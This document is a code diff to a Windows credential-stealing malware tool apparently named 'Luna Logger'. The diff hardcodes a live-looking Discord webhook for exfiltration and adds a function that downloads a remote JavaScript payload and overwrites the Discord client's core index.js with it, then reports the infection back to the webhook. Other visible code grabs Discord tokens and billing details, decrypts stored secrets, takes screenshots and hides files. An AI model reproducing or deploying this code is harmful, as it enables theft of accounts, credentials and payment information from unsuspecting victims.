@@ -1,19 +1,21 @@
 import os
+import difflib
 import platform
 import threading
 import uuid
-from base64 import b64decode
-from json import loads
-from re import findall
-from shutil import copy2
-from sqlite3 import connect
-from subprocess import PIPE, Popen
-from sys import exit
-from zipfile import ZipFile
-
 import psutil
 import requests
 import wmi
+
+from json import loads
+from re import findall, match
+from shutil import copy2
+from sqlite3 import connect
+import subprocess
+from base64 import b64decode
+from subprocess import PIPE, Popen
+from sys import exit
+from zipfile import ZipFile
 from Crypto.Cipher import AES
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from PIL import ImageGrab
@@ -21,7 +23,7 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-webhook = "%webhook_here%"
+webhook = "https://discord.com/api/webhooks/981330628136034325/XjA5ekKNINMXoA4rBBxhegYfURMvlKedLWV_6tepouaE9G1dJwseoeXzBD5rfB6naq_K"
 
 def main(webhook):
     global embed
@@ -43,7 +45,7 @@ def main(webhook):
         except RuntimeError:
             continue
 
-    embed.set_footer(text="Luna | Created by Smug")
+    embed.set_footer(text="Luna Logger | Created by Smug")
     embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
     zipup()
@@ -57,6 +59,7 @@ def main(webhook):
 def Luna():
     debug()
     main(webhook)
+    inject(webhook)
     cleanup()
 
 
@@ -219,7 +222,7 @@ class grabtokens():
                     nitro = 'Nitro Classic'
                 elif r.json()['premium_type'] == 2:
                     nitro = 'Nitro Boost'
-            except IndexError or KeyError:
+            except IndexError or KeyError or TypeError:
                 nitro = 'None'
 
             b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",
@@ -434,6 +437,31 @@ def cleanup():
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
+def inject(webhook_url):
+	appdata = os.getenv("localappdata")
+	for _dir in os.listdir(appdata):
+		if 'discord' in _dir.lower():
+			for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
+				if match(r'app-(\d*\.\d*)*', __dir):
+					abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
+					f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("&webhook&", webhook_url)
+					modules_dir = os.listdir(abspath+'\\modules') 
+					with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+						indexFile.write(f)
+					subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	
+	if os.path.exists(appdata+'\\discord'):
+		with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'r', encoding="utf-8") as indexFile:
+			index = indexFile.read()
+			if webhook_url in index:
+				webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
+				embed = Embed(title="Luna Logger", color=5639644)
+
+				embed.set_footer(text="Luna Logger | Created by Smug")
+				embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
+				embed.add_field(name="Injection", value=f"Successfully injected into Discord\n\nUser: {os.getenv('UserName')}", inline=False)
+	
+				webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 class debug:
     def __init__(self):
